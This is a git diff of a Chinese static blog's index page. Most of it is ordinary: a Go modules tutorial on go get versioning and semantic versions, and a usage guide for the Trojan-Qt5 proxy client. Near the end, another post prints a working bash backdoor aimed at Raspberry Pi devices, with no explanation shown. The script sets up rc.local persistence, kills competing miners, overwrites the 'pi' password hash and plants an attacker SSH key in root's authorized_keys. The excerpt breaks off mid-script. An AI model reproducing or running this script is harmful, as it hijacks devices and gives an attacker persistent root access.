+<tr>
+<td>go get golang.org/x/text<a href="/master">@master </a></td>
+<td>拉取  master  分支的最新  commit</td>
+</tr>
+<tr>
+<td>go get golang.org/x/text<a href="/v0.3.2">@v0.3.2 </a></td>
+<td>拉取  tagv0.3.2  的 commit</td>
+</tr>
+<tr>
+<td>go get golang/x/text<a href="/342b2e">@342b2e </a></td>
+<td>拉取 hash342b2e  的 commit，最终会被转换为 v0.3.2</td>
+</tr>
+</tbody></table>
+<p><a href="">
+</a><br><a href="">
+</a><br>go get 版本选择<br>我们回顾一下我们拉取的 go get github.com/eddycjy/mquote， 其结果是 <code>v0.0.0-20200220041913-e066a990ce6f</code> ，对照着上面所提到的 go get 行为来看，你可能还会有一些疑惑，<br><strong>那么就是在 go get 没有指定任何版本的情况下，它的版本选择规则是怎么样的</strong>，也就是为什么 go get 拉取的是  v0.0.0，它什么时候会拉取正常带版本号的 tags 呢。实际上这需要区分两种情况，如下</p>
+<ol>
+<li>所拉取的模块有发布 tags：<ol>
+<li>如果只有单个模块，那么就取主版本号最大的那个 tag</li>
+<li>如果有多个模块，则推算相应的模块路径，取主版本号最大的那个 tag（子模块的 tag 的模块路径会有前缀要求）</li>
+</ol>
+</li>
+<li>所拉取的模块没有发布过 tags<ol>
+<li>默认取主分支最新一次 commit 的 commithash</li>
+</ol>
+</li>
+</ol>
+<h4 id="没有发布过-tags"><a href="#没有发布过-tags" class="headerlink" title="没有发布过 tags"></a>没有发布过 tags</h4><p>那么为佬以拉取的是 v0.0.0，因为 github.com/eddycjy/mquote 没有发布任何的 tag，</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/190217/1610861317038-557c0ab0-ee10-4f8b-9b6c-ea060d40fb7a.png#align=left&display=inline&height=522&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-01-17%20%E4%B8%8B%E5%8D%881.28.31.png&originHeight=522&originWidth=1454&size=123515&status=done&style=none&width=1454" alt="截屏2021-01-17 下午1.28.31.png"></p>
+<p>因此它默认取的是主分支最新一次 commit 的 commit_time 和 commit_hash，也就是 0200220041913-e066a990ce6f</p>
+<h4 id="有发布过-tags"><a href="#有发布过-tags" class="headerlink" title="有发布过 tags"></a>有发布过 tags</h4><p>在项目有发布 tags 的情况下，还存在着多种模式，也就是只有单个模块和多个模块，我们统一以多个模块来进行展示，因为多个模块的情况下就已经包含了单个模块的使用了，</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/190217/1610861506695-0692c455-2c28-48cb-a1be-93a8810555e4.png#align=left&display=inline&height=842&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-01-17%20%E4%B8%8B%E5%8D%881.31.39.png&originHeight=842&originWidth=1322&size=222789&status=done&style=none&width=1322" alt="截屏2021-01-17 下午1.31.39.png"></p>
+<p>在这个项目中，我们一共打了两个 tag，分别是 v0.0.1 和 module/tour/v0.0.1. 这时候你可能会奇怪，为什么要打 module/tour/v0.0.1 ，这么奇怪的 tag，这有什么意思吗？</p>
+<p>其实 go modules 在同一个项目下多个模块的 tag 表现方式，其主要目录结构为</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">├── go.mod</span><br><span class="line">├── module</span><br><span class="line">│   └── tour</span><br><span class="line">│       ├── go.mod</span><br><span class="line">│       └── tour.go</span><br><span class="line">└── quote.go</span><br></pre></td></tr></table></figure>
+
+<p><a href="">      </a><br><a href="">
+</a><br>可以看到 mquote 这个项目的根目录有一个 go.mod 文件，而在 module/tour 目录下也有一个 go.mod 文件，其模块导入和版本信息的对应关系如下</p>
+<table>
+<thead>
+<tr>
+<th><strong>tag</strong></th>
+<th><strong>模块导入路径</strong></th>
+<th><strong>含义</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>v0.0.1</td>
+<td>github.com/eddycjy/mquote</td>
+<td>mquote  项目的 v0.0.1 版本</td>
+</tr>
+<tr>
+<td>module/tour/v0.0.1</td>
+<td>github.com/eddycjy/mquote/module/tour</td>
+<td>mquote  项目下子模块 module/tour  的 v0.0.1  版本</td>
+</tr>
+</tbody></table>
+<p><a href="">
+</a></p>
+<p><a href="">
+</a></p>
+<h4 id="导入主模块和子模块"><a href="#导入主模块和子模块" class="headerlink" title="导入主模块和子模块"></a>导入主模块和子模块</h4><p>结合上述内容，拉取主模块的话，还是照旧执行如下命令</p>
+<p>go: finding github.com/eddycjy/mquote v0.0.1<br>go: downloading github.com/eddycjy/mquote v0.0.1<br>go: extracting github.com/eddycjy/mquote v0.0.1</p>
+<p>如果是想拉取子模块，执行</p>
+<p>go: finding github.com/eddycjy/mquote/module v0.0.1<br>go: finding github.com/eddycjy/mquote/module/tour v0.0.1<br>go: downloading github.com/eddycjy/mquote/module/tour v0.0.1<br>go: extracting github.com/eddycjy/mquote/module/tour v0.0.1<br><a href="">
+</a></p>
+<p>我们将主模块和子模块的拉取进行对比，你会发现子模块的拉取会多出一步，它会发现 github.com/eddycjy/mquote/module，再继续推算，最终拉取到 module/tour</p>
+<h2 id="go-mod-的导入路径"><a href="#go-mod-的导入路径" class="headerlink" title="go mod 的导入路径"></a>go mod 的导入路径</h2><h3 id="不同版本的导入路径"><a href="#不同版本的导入路径" class="headerlink" title="不同版本的导入路径"></a>不同版本的导入路径</h3><p>在前面的模块拉取和引用中，你会发现我们的模块导入路径就是 github.com/eddycjy/mquote 和 github.com/eddycjy/mquote/module/tour ，似乎并没有什么特殊的。</p>
+<p>其实不然，实际上 go modules 在主版本号为 v0 和 v1 的情况下省略了版本号，而在主版本号为 v2 及以上刚需要明确指定出主版本号，否则会出现冲突，其 tag 与模块导入路径的大致对应关系如下：</p>
+<table>
+<thead>
+<tr>
+<th>tag</th>
+<th>模块导入路径</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>v0.0.0</td>
+<td>github.com/eddycjy/mquote</td>
+</tr>
+<tr>
+<td>v1.0.0</td>
+<td>github.com/eddycjy/mquote</td>
+</tr>
+<tr>
+<td>v2.0.0</td>
+<td>github.com/eddycjy/mquote/v2</td>
+</tr>
+<tr>
+<td>v3.0.0</td>
+<td>github.com/eddycjy/mquote/v3</td>
+</tr>
+</tbody></table>
+<p><a href="">
+</a><br>简单来讲，就是主版本号为 v0 和 v1，不需要在模块导入路径包含主版本信息，而在 v1 版本以后，也就是 v2 起，必须在模块的导入路径末尾加上主版本号，引用时就需要调整为如下格式</p>
+<p><a href="">      </a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import (</span><br><span class="line">    &quot;github.com&#x2F;eddycjy&#x2F;mquote&#x2F;v2&#x2F;example&quot;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p><a href="">
+</a></p>
+<p>另外忽略主版本号 v0 和 v1 是强制性的（不是可选项），因此每个软件包只有一个明确且规范的导入路径。</p>
+<h3 id="为什么忽略-v0、v1"><a href="#为什么忽略-v0、v1" class="headerlink" title="为什么忽略 v0、v1"></a>为什么忽略 v0、v1</h3><ol>
+<li>导入路径中忽略 v1 的原因是：考虑到许多开发人员创建一旦到达 v1 版本便永不改变的软件包，这是官方所鼓励的，不认为所有这些开发人员在无意发布 v2 版本时都应被迫拥有明确的 v1 版本尾缀，<strong>这将导致 v1 版本变成“噪音”且无意义。</strong></li>
+<li>导入路径中忽略了 v0 版本的原因是： 根据语义化版本规范，v0 的这些版本完全没有兼容性保证。需要<strong>一个显式的 v0 版本的标识对确保兼容性没有多大帮助。</strong></li>
+</ol>
+<h2 id="go-modules-语义化版本控制"><a href="#go-modules-语义化版本控制" class="headerlink" title="go modules 语义化版本控制"></a>go modules 语义化版本控制</h2><p>我们不断地在 go modules 的使用中提到版本号，其实质上被称为“语义化版本”，假设我们的版本号 v1.2.3，如下</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/190217/1610861346684-ab7daa23-0890-4a55-82ed-48ff42ec56ed.png#align=left&display=inline&height=598&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-01-17%20%E4%B8%8B%E5%8D%881.29.01.png&originHeight=598&originWidth=1216&size=97845&status=done&style=none&width=1216" alt="截屏2021-01-17 下午1.29.01.png"></p>
+<p>其版本格式为 <strong>主版本号.次版本号.修订号</strong>， 版本号的递增规则如下</p>
+<ol>
+<li>主版本号：当你做了不兼容的 API 修改</li>
+<li>次版本号： 当你做了向下兼容的功能性新增</li>
+<li>修订号：当你做了向下兼容的问题修正。</li>
+</ol>
+<p>假设你是先行版本号或者特殊情况，可以将版本追加到“主版本.次版本号.修订号”的后面，作为延伸</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/190217/1610861427051-ba13e616-eaab-4b7a-b356-a4c77f92e3ea.png#align=left&display=inline&height=502&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-01-17%20%E4%B8%8B%E5%8D%881.30.19.png&originHeight=502&originWidth=1286&size=104448&status=done&style=none&width=1286" alt="截屏2021-01-17 下午1.30.19.png"></p>
+<p>至此我们介绍了 go modules 所支持的两类版本号方式，在我们发布新版本打 tag 时，需要注意遵循，否则不遵循语义化版本规则的版本号都是无法进行拉取的。</p>
+<h3 id="go-moduels-的最小版本选择"><a href="#go-moduels-的最小版本选择" class="headerlink" title="go moduels 的最小版本选择"></a>go moduels 的最小版本选择</h3><p>现在我们已经有一个模块，也有发布的 tag，但是一个模块往往依赖着许多其他的模块，并且不同的模块在依赖时很有可能会出现依赖同一个模块的不同版本，如下</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/190217/1610861456233-18052bae-5a2f-4484-b45b-0bb87273d4b8.png#align=left&display=inline&height=684&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-01-17%20%E4%B8%8B%E5%8D%881.30.52.png&originHeight=684&originWidth=1072&size=252115&status=done&style=none&width=1072" alt="截屏2021-01-17 下午1.30.52.png"></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/01/16/yuque/Go%20Mod%20%E7%BB%88%E6%9E%81%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-yuque/Go 环境变量" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -256,19 +701,19 @@ var _hmt = _hmt || [];
 
 
   
-    <article id="post-yuque/Tro" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-yuque/特洛伊使用说明" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2021/01/03/yuque/Tro/">Tro</a>
+      <a class="article-title" href="/2021/01/03/yuque/%E7%89%B9%E6%B4%9B%E4%BC%8A%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/">特洛伊使用说明</a>
     </h1>
   
 
         
-        <a href="/2021/01/03/yuque/Tro/" class="archive-article-date">
+        <a href="/2021/01/03/yuque/%E7%89%B9%E6%B4%9B%E4%BC%8A%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/" class="archive-article-date">
   	<time datetime="2021-01-03T13:13:23.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-01-03</time>
 </a>
         
@@ -276,10 +721,13 @@ var _hmt = _hmt || [];
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>笔者 Windows 电脑比较慢，慢，慢<br>下载代理软件 <a target="_blank" rel="noopener" href="https://www.yuque.com/attachments/yuque/0/2021/7z/190217/1609680002840-384fab53-a5e4-48d5-94e1-04702f0b01ec.7z?_lake_card=%7B%22uid%22:%221609679990619-0%22,%22src%22:%22https://www.yuque.com/attachments/yuque/0/2021/7z/190217/1609680002840-384fab53-a5e4-48d5-94e1-04702f0b01ec.7z%22,%22name%22:%22Trojan-Qt5-Windows.7z%22,%22size%22:23724484,%22type%22:%22%22,%22ext%22:%227z%22,%22progress%22:%7B%22percent%22:99%7D,%22status%22:%22done%22,%22percent%22:0,%22id%22:%22AD6cQ%22,%22card%22:%22file%22%7D">Trojan-Qt5-Windows.7z</a><br>如果 windows 提示打不开 下载解压缩 <a target="_blank" rel="noopener" href="http://www.winrar.com.cn/">http://www.winrar.com.cn/</a> 软件即可</p>
+        <h1 id="安装包"><a href="#安装包" class="headerlink" title="安装包"></a>安装包</h1><p>下载代理软件 <a target="_blank" rel="noopener" href="https://www.yuque.com/attachments/yuque/0/2021/7z/190217/1609680002840-384fab53-a5e4-48d5-94e1-04702f0b01ec.7z?_lake_card=%7B%22uid%22:%221609679990619-0%22,%22src%22:%22https://www.yuque.com/attachments/yuque/0/2021/7z/190217/1609680002840-384fab53-a5e4-48d5-94e1-04702f0b01ec.7z%22,%22name%22:%22Trojan-Qt5-Windows.7z%22,%22size%22:23724484,%22type%22:%22%22,%22ext%22:%227z%22,%22progress%22:%7B%22percent%22:99%7D,%22status%22:%22done%22,%22percent%22:0,%22id%22:%22AD6cQ%22,%22card%22:%22file%22%7D">Trojan-Qt5-Windows.7z</a><br>如果 windows 提示打不开 下载解压缩 <a target="_blank" rel="noopener" href="http://www.winrar.com.cn/">http://www.winrar.com.cn/</a> 软件即可</p>
 <p>macos <a target="_blank" rel="noopener" href="https://www.yuque.com/attachments/yuque/0/2021/dmg/190217/1611543072025-ca55e697-6187-4f68-a54e-2f07b0d0c4ff.dmg?_lake_card=%7B%22uid%22:%221611542907886-0%22,%22src%22:%22https://www.yuque.com/attachments/yuque/0/2021/dmg/190217/1611543072025-ca55e697-6187-4f68-a54e-2f07b0d0c4ff.dmg%22,%22name%22:%22Trojan-Qt5-macOS+(1).dmg%22,%22size%22:39300693,%22type%22:%22%22,%22ext%22:%22dmg%22,%22progress%22:%7B%22percent%22:99%7D,%22status%22:%22done%22,%22percent%22:0,%22id%22:%225frYR%22,%22card%22:%22file%22%7D">Trojan-Qt5-macOS (1).dmg</a></p>
-<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p><a target="_blank" rel="noopener" href="https://www.yuque.com/murphyyi/blog/bsgts7?_lake_card=%7B%22status%22:%22done%22,%22name%22:%22%E5%AE%89%E8%A3%85.mp4%22,%22size%22:3165670,%22percent%22:100,%22taskId%22:%22IYh5Ld4rMzks%22,%22margin%22:true,%22id%22:%22oXemB%22,%22videoId%22:%22inputs/prod/yuque/2021/190217/mp4/1609680841234-7c5d380b-0a94-4b7b-a6ec-57ce0811cf0f.mp4%22,%22card%22:%22video%22%7D#oXemB"><img src="https://gw.alipayobjects.com/mdn/prod_resou/afts/img/A*NNs6TKOR3isAAAAAAAAAAABkARQnAQ" alt="安装.mp4 (3.02MB)"></a></p>
-<h1 id="windows-使用"><a href="#windows-使用" class="headerlink" title="windows 使用"></a>windows 使用</h1><p><a target="_blank" rel="noopener" href="https://www.yuque.com/murphyyi/blog/bsgts7?_lake_card=%7B%22status%22:%22done%22,%22name%22:%22%E4%BD%BF%E7%94%A8.mp4%22,%22size%22:2699578,%22percent%22:100,%22taskId%22:%22gtUbrKF5RI6Z%22,%22margin%22:true,%22id%22:%222TKQD%22,%22videoId%22:%22inputs/prod/yuque/2021/190217/mp4/1609681118723-5929eda8-e0e0-472b-953d-461d836386cb.mp4%22,%22card%22:%22video%22%7D#2TKQD"><img src="https://gw.alipayobjects.com/mdn/prod_resou/afts/img/A*NNs6TKOR3isAAAAAAAAAAABkARQnAQ" alt="使用.mp4 (2.57MB)"></a></p>
+<p>ios 使用软件(需要非中国大陆 apple id)，否则打开白屏幕：<a target="_blank" rel="noopener" href="https://apps.apple.com/us/app/shadowlink-shadowsocks-tool/id1439686518">https://apps.apple.com/us/app/shadowlink-shadowsocks-tool/id1439686518</a></p>
+<h1 id="解释说明"><a href="#解释说明" class="headerlink" title="解释说明"></a>解释说明</h1><p>PAC 代理：为防火墙智能代理，会自动过滤 中国大陆以内的 ip 地址数据包。 （国内非 T 子，访问国外为 T 子）<br>全局代理：为全局 T 子 如果采用这个模式，中国大陆某些视频网站会提示你版权出现问题或者访问国内网站特别慢的情况发生</p>
+<h1 id="ios-端"><a href="#ios-端" class="headerlink" title="ios 端"></a>ios 端</h1><p><a target="_blank" rel="noopener" href="https://www.yuque.com/murphyyi/blog/bsgts7?_lake_card=%7B%22status%22:%22uploaded%22,%22name%22:%22RPReplay_Final1613837361.MP4%22,%22size%22:123451548,%22percent%22:100,%22taskId%22:%2243bbwmUvodwp%22,%22margin%22:true,%22id%22:%22kacxw%22,%22videoId%22:%22inputs/prod/yuque/2021/190217/MP4/1613838724900-8252848e-cd46-4e23-a92f-238cf1323c43.MP4%22,%22card%22:%22video%22%7D#kacxw"><img src="https://gw.alipayobjects.com/mdn/prod_resou/afts/img/A*NNs6TKOR3isAAAAAAAAAAABkARQnAQ" alt="RPReplay_Final1613837361.MP4 (117.73MB)"></a></p>
+<h1 id="windows-端"><a href="#windows-端" class="headerlink" title="windows 端"></a>windows 端</h1><p><a target="_blank" rel="noopener" href="https://www.yuque.com/murphyyi/blog/bsgts7?_lake_card=%7B%22status%22:%22done%22,%22name%22:%22%E5%AE%89%E8%A3%85.mp4%22,%22size%22:3165670,%22percent%22:100,%22taskId%22:%22IYh5Ld4rMzks%22,%22margin%22:true,%22id%22:%22oXemB%22,%22videoId%22:%22inputs/prod/yuque/2021/190217/mp4/1609680841234-7c5d380b-0a94-4b7b-a6ec-57ce0811cf0f.mp4%22,%22card%22:%22video%22%7D#oXemB"><img src="https://gw.alipayobjects.com/mdn/prod_resou/afts/img/A*NNs6TKOR3isAAAAAAAAAAABkARQnAQ" alt="安装.mp4 (3.02MB)"></a></p>
+<h2 id="windows-使用"><a href="#windows-使用" class="headerlink" title="windows 使用"></a>windows 使用</h2><p><a target="_blank" rel="noopener" href="https://www.yuque.com/murphyyi/blog/bsgts7?_lake_card=%7B%22status%22:%22done%22,%22name%22:%22%E4%BD%BF%E7%94%A8.mp4%22,%22size%22:2699578,%22percent%22:100,%22taskId%22:%22gtUbrKF5RI6Z%22,%22margin%22:true,%22id%22:%222TKQD%22,%22videoId%22:%22inputs/prod/yuque/2021/190217/mp4/1609681118723-5929eda8-e0e0-472b-953d-461d836386cb.mp4%22,%22card%22:%22video%22%7D#2TKQD"><img src="https://gw.alipayobjects.com/mdn/prod_resou/afts/img/A*NNs6TKOR3isAAAAAAAAAAABkARQnAQ" alt="使用.mp4 (2.57MB)"></a></p>
 <h1 id="MacOS-使用"><a href="#MacOS-使用" class="headerlink" title="MacOS 使用"></a>MacOS 使用</h1><p><a target="_blank" rel="noopener" href="https://www.yuque.com/murphyyi/blog/bsgts7?_lake_card=%7B%22status%22:%22done%22,%22name%22:%22tro.mp4%22,%22size%22:105906344,%22percent%22:100,%22taskId%22:%22jtcGxLWC2rzM%22,%22margin%22:true,%22id%22:%22dkdJr%22,%22videoId%22:%22inputs/prod/yuque/2021/190217/mp4/1611553175119-214606d4-c00e-4dd5-98a2-5407cdafe5e8.mp4%22,%22card%22:%22video%22%7D#dkdJr"><img src="https://gw.alipayobjects.com/mdn/prod_resou/afts/img/A*NNs6TKOR3isAAAAAAAAAAABkARQnAQ" alt="tro.mp4 (101MB)"></a></p>
 <h1 id="正常使用状态"><a href="#正常使用状态" class="headerlink" title="正常使用状态"></a>正常使用状态</h1><p><img src="https://cdn.nlark.com/yuque/0/2021/png/190217/1611552878301-bcfa22f2-f08a-44ed-bd17-d71f6481e47d.png#align=left&display=inline&height=86&margin=%5Bobject%20Object%5D&name=image.png&originHeight=86&originWidth=145&size=12770&status=done&style=none&width=145" alt="image.png"><br>蓝色小马 上面带个 G 全局代理</p>
 <p><img src="https://cdn.nlark.com/yuque/0/2021/png/190217/1611552920679-2cb4cf23-df72-47ea-a52f-d93d57ff0bf4.png#align=left&display=inline&height=44&margin=%5Bobject%20Object%5D&name=image.png&originHeight=44&originWidth=76&size=6568&status=done&style=none&width=76" alt="image.png"><br>绿色小马 上面带个 P 国外代理 误伤概率比较高<br><img src="https://cdn.nlark.com/yuque/0/2021/png/190217/1611553009805-f6d8cec9-72ce-4790-8935-cb2f43197e61.png#align=left&display=inline&height=343&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-01-25%2013.36.41.png&originHeight=343&originWidth=494&size=192789&status=done&style=none&width=494" alt="截屏2021-01-25 13.36.41.png"></p>
@@ -297,7 +745,7 @@ var _hmt = _hmt || [];
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2021/01/03/yuque/Tro/">展开全文 >></a>
+          <a class="article-more-a" href="/2021/01/03/yuque/%E7%89%B9%E6%B4%9B%E4%BC%8A%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/">展开全文 >></a>
         </p>
       
 
@@ -605,6 +1053,7 @@ var _hmt = _hmt || [];
     <div class="article-entry" itemprop="articleBody">
       
         <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">MYSELF=`realpath <span class="variable">$0</span>`</span><br><span class="line">DEBUG=/dev/null</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$MYSELF</span> &gt;&gt; <span class="variable">$DEBUG</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$EUID</span>&quot;</span> -ne 0 ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">	NEWMYSELF=`mktemp -u <span class="string">&#x27;XXXXXXXX&#x27;</span>`</span><br><span class="line">	sudo cp <span class="variable">$MYSELF</span> /opt/<span class="variable">$NEWMYSELF</span></span><br><span class="line">	sudo sh -c <span class="string">&quot;echo &#x27;#!/bin/sh -e&#x27; &gt; /etc/rc.local&quot;</span></span><br><span class="line">	sudo sh -c <span class="string">&quot;echo /opt/<span class="variable">$NEWMYSELF</span> &gt;&gt; /etc/rc.local&quot;</span></span><br><span class="line">	sudo sh -c <span class="string">&quot;echo &#x27;exit 0&#x27; &gt;&gt; /etc/rc.local&quot;</span></span><br><span class="line">	sleep 1</span><br><span class="line">	sudo reboot</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">TMP1=`mktemp`</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$TMP1</span> &gt;&gt; <span class="variable">$DEBUG</span></span><br><span class="line"></span><br><span class="line">killall bins.sh</span><br><span class="line">killall minerd</span><br><span class="line">killall node</span><br><span class="line">killall nodejs</span><br><span class="line">killall ktx-armv4l</span><br><span class="line">killall ktx-i586</span><br><span class="line">killall ktx-m68k</span><br><span class="line">killall ktx-mips</span><br><span class="line">killall ktx-mipsel</span><br><span class="line">killall ktx-powerpc</span><br><span class="line">killall ktx-sh4</span><br><span class="line">killall ktx-sparc</span><br><span class="line">killall arm5</span><br><span class="line">killall zmap</span><br><span class="line">killall kaiten</span><br><span class="line">killall perl</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;127.0.0.1 bins.deutschland-zahlung.eu&quot;</span> &gt;&gt; /etc/hosts</span><br><span class="line">rm -rf /root/.bashrc</span><br><span class="line">rm -rf /home/pi/.bashrc</span><br><span class="line"></span><br><span class="line">usermod -p \<span class="variable">$6</span>\<span class="variable">$vGkGPKUr</span>\<span class="variable">$heqvOhUzvbQ66Nb0JGCijh</span>/81sG1WACcZgzPn8A0Wn58hHXWqy5yOgTlYJEbOjhkHD0MRsAkfJgjU/ioCYDeR1 pi</span><br><span class="line"></span><br><span class="line">mkdir -p /root/.ssh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCl0kIN33IJISIufmqpqg54D6s4J0L7XV2kep0rNzgY1S1IdE8HDef7z1ipBVuGTygGsq+x4yVnxveGshVP48YmicQHJMCIljmn6Po0RMC48qihm/9ytoEYtkKkeiTR02c6DyIcDnX3QdlSmEqPqSNRQ/XDgM7qIB/VpYtAhK/7DoE8pqdoFNBU5+JlqeWYpsMO+qkHugKA5U22wEGs8xG2XyyDtrBcw10xz+M7U8Vpt0tEadeV973tXNNNpUgYGIFEsrDEAjbMkEsUw+iQmXg37EusEFjCVjBySGH3F+EQtwin3YmxbB9HRMzOIzNnXwCFaYU5JjTNnzylUBp/XB6B&quot;</span>  &gt;&gt; /root/.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;nameserver 8.8.8.8&quot;</span> &gt;&gt; /etc/resolv.conf</span><br><span class="line">rm -rf /tmp/ktx*</span><br><span class="line">rm -rf /tmp/cpuminer-multi</span><br><span class="line">rm -rf /var/tmp/kaiten</span><br><span class="line"></span><br><span class="line">cat &gt; /tmp/public.pem &lt;&lt;<span class="string">EOFMARKER</span></span><br><span class="line"><span class="string">-----BEGIN PUBLIC KEY-----</span></span><br><span class="line"><span class="string">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC/ihTe2DLmG9huBi9DsCJ90MJs</span></span><br><span class="line"><span class="string">glv7y530TWw2UqNtKjPPA1QXvNsWdiLpTzyvk8mv6ObWBF8hHzvyhJGCadl0v3HW</span></span><br><span class="line"><span class="string">rXneU1DK+7iLRnkI4PRYYbdfwp92nRza00JUR7P4pghG5SnRK+R/579vIiy+1oAF</span></span><br><span class="line"><span class="string">WRq+Z8HYMvPlgSRA3wIDAQAB</span></span><br><span 